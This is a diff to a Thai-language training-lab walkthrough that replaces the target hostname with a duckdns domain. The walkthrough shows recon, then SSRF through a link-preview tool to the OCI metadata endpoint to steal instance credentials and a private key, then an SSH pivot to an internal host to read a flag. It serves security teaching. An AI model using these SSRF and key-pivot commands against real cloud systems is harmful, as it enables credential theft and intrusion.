@@ -3,7 +3,7 @@
 Target จริงบน OCI ไม่ใช่ mock — ทุกคำสั่งด้านล่างยิงใส่ instance จริง แก้ปัญหาจริง
 ไม่ใช่ transcript ตัวอย่าง
 
-**Target ปัจจุบัน:** `https://soulsecure.140.245.110.167.nip.io/` (IP นี้เป็น
+**Target ปัจจุบัน:** `https://soulsecure.duckdns.org/` (IP นี้เป็น
 Reserved Public IP แล้ว ไม่เปลี่ยนอีก — ดู [InstructorKey.md](InstructorKey.md)
 ถ้าอยากรู้เหตุผล)
 
@@ -21,8 +21,8 @@ SoulSecure Inc. (บริษัท cybersecurity เดียวกับที
 ## ขั้นที่ 0: Recon
 
 ```bash
-nmap -sV -p- soulsecure.140.245.110.167.nip.io
-curl -s https://soulsecure.140.245.110.167.nip.io/
+nmap -sV -p- soulsecure.duckdns.org
+curl -s https://soulsecure.duckdns.org/
 ```
 
 จะเจอเว็บบริษัท security ธรรมดา — Home / About / Team / Work — เดินดูให้ทั่ว
@@ -31,7 +31,7 @@ curl -s https://soulsecure.140.245.110.167.nip.io/
 ## ขั้นที่ 1: เจอ internal tool ที่มีช่องโหว่
 
 ```bash
-curl -s https://soulsecure.140.245.110.167.nip.io/staff
+curl -s https://soulsecure.duckdns.org/staff
 ```
 
 จะเจอเครื่องมือชื่อ **"Report Link Preview"** — ให้พนักงานวางลิงก์เพื่อ preview
@@ -39,7 +39,7 @@ curl -s https://soulsecure.140.245.110.167.nip.io/staff
 
 ลองใช้งานปกติดูก่อน:
 ```bash
-curl -s "https://soulsecure.140.245.110.167.nip.io/preview?url=https://example.com"
+curl -s "https://soulsecure.duckdns.org/preview?url=https://example.com"
 ```
 
 จะเห็นว่ามัน fetch URL แล้วโชว์ผลกลับมา — **เซิร์ฟเวอร์เป็นคนยิง request เอง**
@@ -51,7 +51,7 @@ curl -s "https://soulsecure.140.245.110.167.nip.io/preview?url=https://example.c
 `169.254.169.254` — ลองยิงผ่านเครื่องมือ preview:
 
 ```bash
-curl -sG "https://soulsecure.140.245.110.167.nip.io/preview" \
+curl -sG "https://soulsecure.duckdns.org/preview" \
   --data-urlencode "url=http://169.254.169.254/opc/v2/instance/"
 ```
 
@@ -60,7 +60,7 @@ curl -sG "https://soulsecure.140.245.110.167.nip.io/preview" \
 เหมือน AWS) ใส่ผ่าน `headers=` ที่เครื่องมือรองรับอยู่แล้ว:
 
 ```bash
-curl -sG "https://soulsecure.140.245.110.167.nip.io/preview" \
+curl -sG "https://soulsecure.duckdns.org/preview" \
   --data-urlencode "url=http://169.254.169.254/opc/v2/instance/metadata/" \
   --data-urlencode 'headers={"Authorization":"Bearer Oracle"}'
 ```
@@ -98,9 +98,9 @@ cat internal01_key.pem   # ควรเป็น RSA private key จริง
 
 ```bash
 # อัปโหลด key ไปที่ web-01 ก่อน (ในสถานการณ์จริง คุณมี shell บน web-01 อยู่แล้ว)
-scp -i <your-key> internal01_key.pem ubuntu@140.245.110.167:~/
+scp -i <your-key> internal01_key.pem ubuntu@soulsecure.duckdns.org:~/
 
-ssh -i <your-key> ubuntu@140.245.110.167 \
+ssh -i <your-key> ubuntu@soulsecure.duckdns.org \
   "chmod 600 ~/internal01_key.pem && ssh -o StrictHostKeyChecking=no -i ~/internal01_key.pem ubuntu@10.0.2.56 'cat /home/ubuntu/flag.txt'"
 ```
 
